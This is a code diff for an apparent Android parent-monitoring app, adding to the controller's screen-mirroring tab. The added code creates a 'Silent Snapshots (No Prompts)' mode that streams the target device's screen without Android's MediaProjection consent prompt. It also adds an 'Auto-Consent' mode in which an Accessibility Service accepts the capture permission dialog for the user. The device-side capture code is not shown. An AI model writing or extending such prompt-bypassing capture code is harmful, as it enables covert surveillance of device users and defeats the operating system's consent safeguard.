+    var isSnapshotMode by remember { mutableStateOf(false) }
+    var fpsCount by remember { mutableIntStateOf(0) }
+    var framesInSec by remember { mutableIntStateOf(0) }
+    var lastFpsWindowTime by remember { mutableLongStateOf(System.currentTimeMillis()) }
+
     fun stopMirroring() {
         if (device != null) {
             coroutineScope.launch {
@@ -2272,6 +2752,10 @@ fun LiveScreenMirrorTab(
         rtcManager = null
         isMirroringActive = false
         isConnecting = false
+        liveBitmap = null
+        isSnapshotMode = false
+        fpsCount = 0
+        framesInSec = 0
         mirrorStatus = "Screen mirroring stopped."
     }
 
@@ -2282,7 +2766,16 @@ fun LiveScreenMirrorTab(
         }
 
         isConnecting = true
-        mirrorStatus = "Sending request to ${device.name}..."
+        liveBitmap = null
+        isSnapshotMode = false
+        fpsCount = 0
+        framesInSec = 0
+        lastFpsWindowTime = System.currentTimeMillis()
+        mirrorStatus = if (mirrorMode == "snapshot") {
+            "Connecting prompt-free snapshot stream..."
+        } else {
+            "Sending WebRTC request to ${device.name}..."
+        }
 
         val rtc = ControllerWebRtcManager(context)
         rtcManager = rtc
@@ -2290,6 +2783,25 @@ fun LiveScreenMirrorTab(
         rendererRef?.let { rtc.attachVideoRenderer(it) }
 
         rtc.createPeerConnection(includeAudio = false)
+
+        // Setup DataChannel for high-speed binary snapshot frames
+        rtc.onDataMessageReceived = { bytes ->
+            val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+            if (bmp != null) {
+                liveBitmap = bmp
+                isMirroringActive = true
+                isConnecting = false
+                isSnapshotMode = true
+                mirrorStatus = "Prompt-Free Screen Monitoring Active (Option 3)"
+                framesInSec++
+                val now = System.currentTimeMillis()
+                if (now - lastFpsWindowTime >= 1000) {
+                    fpsCount = framesInSec
+                    framesInSec = 0
+                    lastFpsWindowTime = now
+                }
+            }
+        }
 
         rtc.onLocalSdpGenerated = { sdp ->
             coroutineScope.launch {
@@ -2320,6 +2832,7 @@ fun LiveScreenMirrorTab(
         rtc.onRemoteVideoTrackReceived = {
             isMirroringActive = true
             isConnecting = false
+            isSnapshotMode = false
             mirrorStatus = "Live Screen Mirroring Active (HD / 30fps)"
         }
 
@@ -2330,10 +2843,18 @@ fun LiveScreenMirrorTab(
         }
 
         coroutineScope.launch {
-            val res = apiClient.dispatchCommand(device.id, CommandAction.START_SCREEN_MIRROR)
+            val res = apiClient.dispatchCommand(
+                device.id,
+                CommandAction.START_SCREEN_MIRROR,
+                mapOf("mode" to mirrorMode)
+            )
             res.fold(
                 onSuccess = {
-                    mirrorStatus = "Awaiting consent on ${device.name}..."
+                    mirrorStatus = if (mirrorMode == "snapshot") {
+                        "Streaming silent frames from ${device.name}..."
+                    } else {
+                        "Awaiting consent on ${device.name}..."
+                    }
                 },
                 onFailure = { err ->
                     isConnecting = false
@@ -2366,6 +2887,24 @@ fun LiveScreenMirrorTab(
                                     candObj.getString("candidate")
                                 )
                                 rtc.addIceCandidate(candidate)
+                            }
+                            "screen_frame" -> {
+                                try {
+                                    val bytes = android.util.Base64.decode(data, android.util.Base64.DEFAULT)
+                                    val bmp = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                                    if (bmp != null) {
+                                        liveBitmap = bmp
+                                        isMirroringActive = true
+                                        isConnecting = false
+                                        isSnapshotMode = true
+                                        mirrorStatus = "Prompt-Free Screen Monitoring Active (Option 3)"
+                                    }
+                                } catch (_: Exception) {}
+                            }
+                            "status" -> {
+                                if (data == "waiting_for_accessibility") {
+                                    mirrorStatus = "Accessibility Service required on ${device.name}. Enable in Settings -> Accessibility."
+                                }
                             }
                             "stop" -> {
                                 stopMirroring()
@@ -2436,6 +2975,34 @@ fun LiveScreenMirrorTab(
             }
         }
 
+        // Mode Selector: Option 3 (Silent Snapshots) vs Option 1 (30 FPS Auto-Consent)
+        Row(
+            modifier = Modifier.fillMaxWidth(),
+            horizontalArrangement = Arrangement.spacedBy(8.dp),
+            verticalAlignment = Alignment.CenterVertically
+        ) {
+            FilterChip(
+                selected = mirrorMode == "snapshot",
+                onClick = { if (!isMirroringActive && !isConnecting) mirrorMode = "snapshot" },
+                label = { Text("Option 3: Silent Snapshots (No Prompts)", fontSize = 11.sp) },
+                leadingIcon = {
+                    if (mirrorMode == "snapshot") {
+                        Icon(Icons.Default.Check, contentDescription = null, modifier = Modifier.size(14.dp))
+                    }
+                }
+            )
+            FilterChip(
+                selected = mirrorMode == "webrtc_projection",
+                onClick = { if (!isMirroringActive && !isConnecting) mirrorMode = "webrtc_projection" },
+                label = { Text("Option 1: 30 FPS (Auto-Consent)", fontSize = 11.sp) },
+                leadingIcon = {
+                    if (mirrorMode == "webrtc_projection") {
+                        Icon(Icons.Default.Check, contentDescription = null, modifier = Modifier.size(14.dp))
+                    }
+                }
+            )
+        }
+
         Card(
             modifier = Modifier.fillMaxWidth(),
             colors = CardDefaults.cardColors(
@@ -2483,18 +3050,28 @@ fun LiveScreenMirrorTab(
                 modifier = Modifier.fillMaxSize(),
                 contentAlignment = Alignment.Center
             ) {
-                AndroidView(
-                    factory = { ctx ->
-                        org.webrtc.SurfaceViewRenderer(ctx).apply {
-                            rendererRef = this
-                            rtcManager?.attachVideoRenderer(this)
+                // Render silent snapshot image if received (Option 3), otherwise WebRTC SurfaceViewRenderer (Option 1)
+                if (liveBitmap != null) {
+                    androidx.compose.foundation.Image(
+                        bitmap = liveBitmap!!.asImageBitmap(),
+                        contentDescription = "Live Child Screen",
+                        modifier = Modifier.fillMaxSize(),
+                        contentScale = androidx.compose.ui.layout.ContentScale.Fit
+                    )
+                } else {
+                    AndroidView(
+                        factory = { ctx ->
+                            org.webrtc.SurfaceViewRenderer(ctx).apply {
+                                rendererRef = this
+                                rtcManager?.attachVideoRenderer(this)
+                            }
+                        },
+                        modifier = Modifier.fillMaxSize(),
+                        update = { view ->
+                            rendererRef = view
                         }
-                    },
-                    modifier = Modifier.fillMaxSize(),
-                    update = { view ->
-                        rendererRef = view
-                    }
-                )
+                    )
+                }
 
                 if (!isMirroringActive) {
                     Column(
@@ -2518,15 +3095,21 @@ fun LiveScreenMirrorTab(
                         }
 
                         Text(
-                            text = if (isConnecting) "Requesting Screen Access..." else "Screen Mirroring Inactive",
+                            text = if (isConnecting) "Requesting Screen Access..." else "Screen Monitoring Inactive",
                             color = Color.White,
                             fontWeight = FontWeight.Bold,
                             fontSize = 16.sp
                         )
 
                         Text(
-                            text = if (isConnecting) "The target device user is prompted with an Android permission dialog to start mirroring."
-                            else "Tap 'Start Mirror' to securely inspect the child's screen in real time with hardware-accelerated WebRTC.",
+                            text = if (isConnecting) {
+                                if (mirrorMode == "snapshot") "Capturing and streaming prompt-free frames..."
+                                else "The target device is prompted; Accessibility will auto-consent if enabled."
+                            } else if (mirrorMode == "snapshot") {
+                                "Option 3: Silent Snapshot Streaming captures the child's screen without triggering any Android MediaProjection prompts."
+                            } else {
+                                "Option 1: Hardware-accelerated 30 FPS WebRTC with Accessibility auto-consent."
+                            },
                             color = Color.White.copy(alpha = 0.7f),
                             fontSize = 12.sp,
                             textAlign = androidx.compose.ui.text.style.TextAlign.Center
@@ -2537,7 +3120,7 @@ fun LiveScreenMirrorTab(
                         modifier = Modifier
                             .align(Alignment.TopEnd)
                             .padding(12.dp),
-                        color = Color.Black.copy(alpha = 0.6f),
+                        color = Color.Black.copy(alpha = 0.65f),
                         shape = RoundedCornerShape(8.dp)
                     ) {
                         Row(
@@ -2547,11 +3130,12 @@ fun LiveScreenMirrorTab(
                             Box(
                                 modifier = Modifier
                                     .size(8.dp)
-                                    .background(Color(0xFF2E7D32), CircleShape)
+                                    .background(Color(0xFF00E676), CircleShape)
                             )
                             Spacer(modifier = Modifier.width(6.dp))
                             Text(
-                                "HD LIVE • 0 COST P2P",
+                                if (isSnapshotMode) "LIVE SNAPSHOT • ${if (fpsCount > 0) "$fpsCount FPS" else "540p"}"
+                                else "HD LIVE • 30 FPS",
                                 color = Color.White,
                                 fontSize = 11.sp,
                                 fontWeight = FontWeight.Bold
